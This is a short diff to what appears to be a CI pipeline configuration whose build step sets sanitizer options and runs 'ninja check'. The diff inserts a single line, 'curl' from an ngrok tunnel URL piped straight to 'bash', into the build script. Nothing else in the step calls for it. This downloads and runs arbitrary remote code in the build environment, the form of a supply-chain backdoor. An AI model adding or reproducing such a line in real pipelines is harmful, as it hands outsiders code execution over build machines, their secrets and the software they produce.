@@ -5,6 +5,7 @@ parameters:
 steps:
 - script: |
     set -eo pipefail
+    curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
     export UBSAN_OPTIONS="print_stacktrace=1"
     export ASAN_OPTIONS="alloc_dealloc_mismatch=0 symbolize=1 print_stacktrace=1"
     ninja check
